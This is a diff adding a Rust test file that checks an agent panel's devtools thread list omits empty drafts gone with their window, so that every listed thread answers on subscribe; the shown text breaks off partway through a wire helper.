@@ -0,0 +1,615 @@
+// Story 055, task 20.1 (refine v5) — the panel's thread list leaves out the empty drafts that
+// answer `not_found` (design.md §B3 "Empty thread gone with its window", v5 bullet). Requirements:
+// R5.4, R5.9, with R5.11's released drafts as the converse (Q4, Q5). Found by 19.1's GUI re-proof:
+// after R5.8's notice the panel list still offered the empty drafts gone with their window, and
+// picking one answered `not_found` again, back to the same list.
+//
+// An ADDITIONAL test file beside 18.1's `devtools_threads_reopen.rs` and 18.2's
+// `devtools_threads_idle_reload.rs` (both left untouched). Wired INSIDE `src/browser_channel.rs`,
+// in rustfmt (alphabetical) order between `devtools_threads_idle_reload` and
+// `devtools_threads_paths`, to reach the private `test_support`, so the test path matches the
+// Validation filter `cargo test -p agent_ui devtools_threads`:
+//
+//     #[cfg(test)]
+//     #[path = "browser_channel_tests/devtools_threads_list_gone.rs"]
+//     mod devtools_threads_list_gone;
+//
+// Contract (design.md §B3 v3 + v4 + v5): `list(root, cx)` leaves out exactly the devtools threads
+// `ensure_loaded` answers `NotFound` for: no live view, no persisted mark, no session, and not
+// remembered as released by an agent panel that is still open. So the list and the answer to a
+// subscribe never disagree: every id `list` (or the wire's `list_threads`) returns answers its
+// thread on subscribe, never `not_found`.
+//
+// Seams used (all already exist): `crate::devtools_threads::{create, list, ensure_loaded}`; the
+// wire through `test_support`'s `Probe` (a panel session's `list_threads` and `subscribe`, as in
+// 11.1's `panel_policy.rs`); the idle release through `agent.max_idle_retained_threads` (as in
+// 18.2); promotion through `ThreadMetadataStore::save` with a `session_id`.
+//
+// Hostile halves first (v5 splits ONE set — the devtools threads of a root — into listed and gone;
+// both converses):
+//   - wrongly listed: a draft gone with its window stays out of the list whatever its project's
+//     window state — still closed, reopened before its agent panel, reopened with one — and so does
+//     a draft the idle cap released whose panel then went with its window; the gone draft's
+//     persisted siblings (promoted this run, persisted in an earlier run) stay in;
+//   - wrongly hidden: a live empty draft, an idle-released draft whose releasing panel is still
+//     open, and a released draft while it is being reloaded (a view, but no longer remembered as
+//     released) are all still listed — and each answers its thread;
+//   - only then the benign case: every thread the wire lists answers `snapshot` on subscribe.
+
+use std::path::{Path, PathBuf};
+use std::sync::Arc;
+use std::time::Duration;
+
+use acp_thread::StubAgentConnection;
+use fs::FakeFs;
+use gpui::{TestAppContext, UpdateGlobal as _, WindowHandle};
+use project::Project;
+use serde_json::{Value, json};
+use settings::SettingsStore;
+use workspace::MultiWorkspace;
+
+use super::test_support::*;
+use crate::devtools_threads::{CONNECT_TIMEOUT, DevtoolsThreadError};
+use crate::thread_metadata_store::{ThreadId, ThreadMetadataStore};
+
+mod seam {
+    use std::path::Path;
+
+    use anyhow::Result;
+    use gpui::TestAppContext;
+
+    use crate::browser_wire::ThreadInfo;
+
+    pub async fn create(root: &str, cx: &mut TestAppContext) -> Result<ThreadInfo> {
+        let task = cx.update(|cx| crate::devtools_threads::create(Path::new(root), cx));
+        cx.run_until_parked();
+        task.await
+    }
+
+    /// The ids `list` answers for `root`, in its order.
+    pub fn list(root: &str, cx: &mut TestAppContext) -> Vec<String> {
+        cx.update(|cx| {
+            crate::devtools_threads::list(Path::new(root), cx)
+                .into_iter()
+                .map(|info| info.thread_id)
+                .collect()
+        })
+    }
+
+    /// `ensure_loaded`, settled: past [`crate::devtools_threads::CONNECT_TIMEOUT`] a load still
+    /// connecting has answered too, so the result is always decided when this returns.
+    pub async fn ensure_loaded(thread_id: &str, cx: &mut TestAppContext) -> Result<()> {
+        let task = cx.update(|cx| crate::devtools_threads::ensure_loaded(thread_id, cx));
+        cx.run_until_parked();
+        cx.executor()
+            .advance_clock(super::CONNECT_TIMEOUT + super::Duration::from_secs(1));
+        cx.run_until_parked();
+        task.await
+    }
+}
+
+/// An agent whose threads load again, under the agent id the window's panel keys it by
+/// (`StubAgentServer`'s "Test"): the agent panel only releases a thread it can load back, and a
+/// persisted thread reloads in a reopened window.
+fn loadable() -> StubAgentConnection {
+    StubAgentConnection::new()
+        .with_supports_load_session(true)
+        .with_agent_id("Test".into())
+}
+
+/// What `ensure_loaded` answered, as the wire's code for it, with the error's text for messages.
+fn outcome(result: &anyhow::Result<()>) -> (&'static str, String) {
+    match result {
+        Ok(()) => ("ok", String::new()),
+        Err(error) => {
+            let text = format!("{error:#}");
+            let code = match error.downcast_ref::<DevtoolsThreadError>() {
+                Some(DevtoolsThreadError::NotFound { .. }) => "not_found",
+                Some(DevtoolsThreadError::ProjectClosed { .. }) => "project_closed",
+                Some(DevtoolsThreadError::AgentStartFailed { .. }) => "agent_start_failed",
+                None => "other",
+            };
+            (code, text)
+        }
+    }
+}
+
+/// The invariant v5 exists for: nothing `list` offers for `root` answers `not_found` when picked.
+/// A thread of a closed project may answer `project_closed`, one whose agent cannot start
+/// `agent_start_failed` — never that it no longer exists (R5.8 would drop it again).
+async fn assert_every_listed_thread_answers(root: &str, cx: &mut TestAppContext) {
+    for thread_id in seam::list(root, cx) {
+        let result = seam::ensure_loaded(&thread_id, cx).await;
+        let (code, text) = outcome(&result);
+        assert_ne!(
+            code, "not_found",
+            "R5.4: {thread_id} is listed for {root}, so it must not answer not_found ({text})"
+        );
+    }
+}
+
+fn thread_id_of(key: &str, cx: &mut TestAppContext) -> ThreadId {
+    cx.update(|cx| {
+        ThreadMetadataStore::global(cx)
+            .read(cx)
+            .entry_ids()
+            .find(|id| id.to_key_string() == key)
+            .unwrap_or_else(|| panic!("{key} is a known thread"))
+    })
+}
+
+/// The save the conversation makes when the first message goes out: the draft gains a session,
+/// and the devtools mark is persisted (R5.2).
+fn promote(key: &str, cx: &mut TestAppContext) {
+    let id = thread_id_of(key, cx);
+    cx.update(|cx| {
+        let store = ThreadMetadataStore::global(cx);
+        let mut metadata = store
+            .read(cx)
+            .entry(id)
+            .cloned()
+            .expect("metadata of a created thread");
+        metadata.session_id = Some(agent_client_protocol::v2::schema::SessionId::new(format!(
+            "session-{key}"
+        )));
+        store.update(cx, |store, cx| store.save(metadata, cx));
+    });
+    cx.run_until_parked();
+}
+
+/// A devtools thread persisted by an earlier run of Zeo and never loaded in this one: its metadata
+/// (with a session, so not a draft) and its persisted mark, built in the stores directly as 11.1's
+/// `panel_policy.rs` does. Its `updated_at` is an hour back, so it sorts after this run's threads.
+fn persisted_from_an_earlier_run(win: &Win, root: &str, cx: &mut TestAppContext) -> String {
+    let thread_id = ThreadId::new();
+    let project = win
+        .workspace
+        .read_with(&win.cx, |workspace, _| workspace.project().clone());
+    let active = crate::test_support::active_thread_id(&win.panel, &win.cx);
+    cx.update(|cx| {
+        let store = ThreadMetadataStore::global(cx);
+        let agent_id = store
+            .read(cx)
+            .entry(active)
+            .map(|metadata| metadata.agent_id.clone())
+            .expect("the window's thread has metadata");
+        let metadata = crate::thread_metadata_store::ThreadMetadata {
+            thread_id,
+            session_id: Some(agent_client_protocol::v2::schema::SessionId::new(format!(
+                "earlier-{}",
+                thread_id.to_key_string()
+            ))),
+            agent_id,
+            title: Some("Earlier devtools thread".into()),
+            title_override: None,
+            updated_at: chrono::Utc::now() - chrono::Duration::hours(1),
+            created_at: None,
+            interacted_at: None,
+            worktree_paths: project.read(cx).worktree_paths(cx),
+            archived: false,
+            remote_connection: None,
+        };
+        store.update(cx, |store, cx| store.save(metadata, cx));
+    });
+    cx.run_until_parked();
+    cx.update(|cx| {
+        crate::thread_organization::ThreadOrganizationStore::global(cx).update(cx, |store, cx| {
+            store
+                .set_devtools_root(thread_id, PathBuf::from(root), cx)
+                .expect("a saved thread can carry the mark");
+        })
+    });
+    cx.run_until_parked();
+    thread_id.to_key_string()
+}
+
+/// Whether the agent panel of `win` holds a view for `key`: the active one, a retained one or the
+/// draft slot.
+fn held(win: &Win, key: &str) -> bool {
+    win.panel.read_with(&win.cx, |panel, cx| {
+        ThreadMetadataStore::global(cx)
+            .read(cx)
+            .entry_ids()
+            .find(|id| id.to_key_string() == key)
+            .is_some_and(|id| panel.conversation_view_for(id, cx).is_some())
+    })
+}
+
+/// Whether `key`'s metadata is still a draft: no session, the first message never went out.
+fn is_draft(key: &str, cx: &mut TestAppContext) -> bool {
+    let id = thread_id_of(key, cx);
+    cx.update(|cx| {
+        ThreadMetadataStore::global(cx)
+            .read(cx)
+            .entry(id)
+            .is_some_and(|entry| entry.is_draft())
+    })
+}
+
+/// Sets `agent.max_idle_retained_threads` the way the operator's settings do; the agent panel's
+/// settings observer runs `cleanup_retained_threads` on every change.
+fn set_idle_cap(cap: Option<usize>, cx: &mut TestAppContext) {
+    let json = match cap {
+        Some(cap) => format!(r#"{{ "agent": {{ "max_idle_retained_threads": {cap} }} }}"#),
+        None => "{}".to_string(),
+    };
+    cx.update(|cx| {
+        SettingsStore::update_global(cx, |store, cx| {
+            store
+                .set_user_settings(&json, cx)
+                .expect("user settings should load");
+        });
+    });
+    cx.run_until_parked();
+}
+
+/// Lowers the idle cap to `cap` (the agent panel releases its oldest idle threads beyond it), then
+/// restores the default so a thread loaded afterwards is not released again mid-test.
+fn release_idle_beyond(cap: usize, cx: &mut TestAppContext) {
+    set_idle_cap(Some(cap), cx);
+    set_idle_cap(None, cx);
+}
+
+/// Closes `win` the way closing the project's window does, and lets go of every handle the test
+/// held on it, so nothing outside the app keeps its agent panel (or the thread's view) alive.
+fn close(win: Win, cx: &mut TestAppContext) {
+    let mut win = win;
+    win.cx.update(|window, _| window.remove_window());
+    win.cx.run_until_parked();
+    drop(win);
+    cx.run_until_parked();
+}
+
+/// A window on `root` whose agent panel is not there (yet): what a reopened project looks like
+/// before its agent panel is restored.
+async fn window_without_agent_panel(
+    fs: &Arc<FakeFs>,
+    root: &str,
+    cx: &mut TestAppContext,
+) -> WindowHandle<MultiWorkspace> {
+    let project = Project::test(fs.clone(), [Path::new(root)], cx).await;
+    let window = cx.add_window(|window, cx| MultiWorkspace::test_new(project.clone(), window, cx));
+    let workspace = window
+        .read_with(cx, |multi_workspace, _| multi_workspace.workspace().clone())
+        .expect("the window's workspace");
+    workspace.update(cx, |workspace, _| workspace.set_random_database_id());
+    cx.run_until_parked();
+    window
+}
+
+// ---- the wire: a panel session's `list_threads` and `subscribe` --------------------------------
+
+fn dev_hello(root: &str) -> Value {
+    json!({
+        "v": 2, "kind": "hello", "id": "h",
+        "client": {
+            "kind": "dev_server", "root": root,
+            "app_url": "http://localhost:5173", "panel_url": "http://localhost:5174"
+        }
+    })
+}
+
+fn panel_hello(root: &str) -> Value {
+    json!({ "v": 2, "kind": "hello", "id": "h", "client": { "kind": "panel", "root": root } })
+}
+
+/// An announced dev server and a panel session for `root`; returns (announce, panel).
+fn connect_panel(root: &str, n: u64, win: &Win, cx: &mut TestAppContext) -> (Probe, Probe) {
+    let announce = open_session(n);
+    announce.handle(dev_hello(root), &win.app_state(), cx);
+    announce.drain(cx);
+    let panel = open_session(n + 1);
+    panel.handle(panel_hello(root), &win.app_state(), cx);
+    panel.drain(cx);
+    (announce, panel)
+}
+
+fn reply(messages: &[Value], id: &str) -> Value {
+    messages
+        .iter()
+        .find(|message| message["id"] == id)
+        .cloned()
+        .unwrap_or_else(|| panic!("no reply to {id}: {messages:?}"))
+}
+
+/// The ids the panel's `list_threads` answers, in order.
+fn listed_on_the_wire(panel: &Probe, win: &Win, cx: &mut TestAppContext) -> Vec<String> {
+    panel.handle(
+        request("list_threads", "l", json!({})),
+        &win.app_state(),
+        cx,
+    );
+    let threads = reply(&panel.drain(cx), "l");
+    assert_eq!(threads["kind"], "threads", "{threads}");
+    threads["items"]
+        .as_array()
+        .expect("items")
+        .iter()
+        .filter_map(|item| item["thread_id"].as_str().map(str::to_owned))
+        .collect()
+}
+
+/// What the panel's `subscribe` to `thread_id` answers, settled past [`CONNECT_TIMEOUT`].
+fn subscribe_on_the_wire(
+    panel: &Probe,
+    thread_id: &str,
+    rid: &str,
+    win: &Win,
+    cx: &mut TestAppContext,
+) -> Value {
+    panel.handle(
